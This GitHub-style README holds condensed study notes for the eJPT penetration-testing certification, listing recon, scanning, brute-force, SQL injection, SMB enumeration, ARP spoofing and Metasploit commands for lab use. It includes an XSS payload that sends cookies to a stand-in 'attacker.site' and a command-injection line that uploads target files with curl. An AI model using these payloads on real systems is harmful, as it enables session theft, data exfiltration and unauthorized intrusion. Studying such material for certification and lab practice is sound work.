
# eJPT-resources

what is eJPT?
The eLearnSecurity Junior Penetration Tester (eJPT) is a 100% practical certification on penetration testing and information security essentials. Bypassing the exam, a cybersecurity professional proves to employers they are ready for a rewarding new career.


skills you need:

    Protocol,Ip
    DHCP, NAT
    Routing --> https://www.grandmetric.com/2018/01/20/how-does-routing-table-work/ 
    Dns --> https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/
    Traffic flow (Wireshark) --> https://www.comparitech.com/net-admin/wireshark-cheat-sheet/ 
    and Ports and Services --> https://www.stationx.net/common-ports-cheat-sheet/  

The most tools useful for the exam:

 	- nmap
 	- gobuster or dirb
 	- burp suite
 	- nessus or other tool for Vulnerability Assessment
 	- mysql 
 	- sqlmap
 	- hydra
 	- enum4linux
	- metasploit


# condensed_notes

###  1- information gathering

     help to Understand the target organization widen the attack surface and amount efficient and targeted attacks
  
1- Domain enumeration:

•	dnsdumpster.com

•	sublist3r -d <domain> -o <output file>
    
•	whois <domain>


### 2- scanning and fingerprinting

    help to perform efficient and have knowledge of the scope targets 
  
2.1- Scanning:
    
Ping sweep:
    
o	Ping --> for alive hosts:
    
     fping -a -g <network_id/cidr> 2> /dev/null/
    
    nmap -sn < network_id/cidr > [--> ping sweep]

2.2- OS fingerprinting:
  
    nmap -O <OS fingerprinting>
    
2.3- scan ports:
  
o	Nmap 
    
	nmap -sn <host discovery, is it up or not> 
    
	nmap -sT <full tcp 3 way shake>
    
	nmap -sS < syn scan, lighter on the network>
    
	nmap -iL <import from list>
    
	nmap -sV < version detection>
    
	nmap -O <OS fingerprinting> 
    
	nmap -A <all>

    
### 3- vulnerability assessment

    help to prepare yourself for exploitation 
  
3.1-	Nessus 
    from --> https://www.tenable.com/downloads/nessus?loginAttempted=true
    
	To run Nessus: /bin/systemctl start nessusd.service
    
	To run web: https://kali:8834/
  
3.2- To scan the XSS vulnerability:
    
    example: 
    xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto
  
3.3- nikto
    
     nikto -h <url>

3.4- nmap
    
    nmap –script vuln <ip>
    
    example:

	Nmap --script smb-check-vuln-* -p445 <ip>  >>new


    
### 4- exploit 

4.1- fingerprinting:

banner grabbing:

	netcat / nc <target address> <port> -v <for verbos>
  ** should be all upper case

	opennssl s_client -connect <ip: port> <this is for ssl /tsl services>

	httprint -p0 -h <target host> -s < signature file> 
  
4.2- Find hidden dier:

   cd dirsearch

   python3 dirsearch.py -u <URL> -e <EXTENSIONS>

   Dirbuster
       
 
4.3- vulnerability:
  
#### 4.3.1- XSS (cross site script):

Script to show cookie in the alert:

    <script>alert(document.cookie);</script>

Script for send cookies every time someone enters to contact page by:

    <script> 
    var i = new Image(); 
    i.src="http://attacker.site/get.php? cookie="+escape(document.cookie)</script>

webPage1:
My server (receive cookies id):

http://attacker.site /get.php?p=<payloads>

web	page2:

show cookies Hach:http://attacker.site/jar.txt

#### 4.3.2 - SQLi:

	Sqlmap 

	sqlmap -u <url>  -p <parameter> --technique=<B,U>

	sqlmap -u <url>  -data <data from burp> -p <parameter>

	sqlmap -r <http request file> --os-shell

	--dbs show databases

	--tables <show tables>

	-T <select table>

	--columns <show columns>

	-C <select columns >

	--dump <extract the data>


Example: 
    
sqlmap -u <url>  -p <parameter> ?id=1

sqlmap -u <url>  -p <parameter> ?id=1 -b

sqlmap -u <url>  -p <parameter> ?id=1 --tables 

sqlmap -u <url> -p <parameter> ?id=1 --currennt -db <database> --columns

sqlmap -u <url> -p <parameter> ?id=1 --currennt -db <database> --dump


#### 4.3.3 -MySQL:

    mysql -u <username> -p<password> -h <host> 
 
use <name of database>

show tables;

select * from <table name>;

System Attacks and Network Attacks:

#### 4.3.4 -Password crack and brute force:

	hydra -L <name list> -P <pass list>  telnet://<ip>

	hydra -L <name list> -P <pass list>  <ip> ssh

	john -wordlist=<word list> <hash file>

	unshadow <file> >  <file.txt>

#### 4.3.5 -REC: 

	scp ssh@<host ip>/path file> 

	talent <domain> -l <name>

	ssh <username@domain>
    
#### 4.3.6	-Command parameter 
 
    example:
    http://demo.ine.local:8000?cmd<parameter>=curl+<local machine>+--upload-file+<target file>

#### 4.3.7 -null sessions

emumeration 

	enum4linux 

	emun4linux -n <domain> : do an nmblookup 

	emun4linux -P <domain> : to cheek password policy

	emun4linux -S <domain>: will give us information about the SMB shares on the machine

	emun4linux -U <domain> : to view users

	emun4linux -a <domain> :  run all simple enumeration

	smbclient -L <ip>

	smbclient //<ip>/<share folder>

	smbclient \\\\<ip>\\ <share folder>

	get <share folder> <host path> --> to get files to local machine


#### 4.3.8 -Arp spoofing:

	Echo 1 > /proc/sys/net/ipv4/ip_forward : to run as router

	Echo 0 > /proc/sys/net/ipv4/ip_forward :to stop router

	Arpspoof -I <interface> -t <target> -r <host>
    

    
Metasploit:

•	msfconsole: to run Metasploit

•	search <search_term>: search for vulnerability …

•	use <number/name>: Load config. (For exploit)

•	set <payload >: For assign payload 

•	 run / exploit 

-->	Show<any>: list option about payload, exploit……

-->	Info: show vulnerability information 

-->	back: return to main banner

-->	Set < variable > < value >: assign value to a variable (for option)

-->	getuid 

-->	getsystem

 
#### Netcat 

    Nc  <option>  <host>  <port> 

    Ex: nc -nlvp 127

 ________________________________________________________________
    
Certification details: https://elearnsecurity.com/product/ejpt-certification/
    
Lesson Plan : https://github.com/hmaverickadams/Beginner-Network-Pentesting

resources I used, but not necessary to pass:
    
1- TryHackMe:  https://tryhackme.com
    
2- hackthebox :https://www.hackthebox.com

    
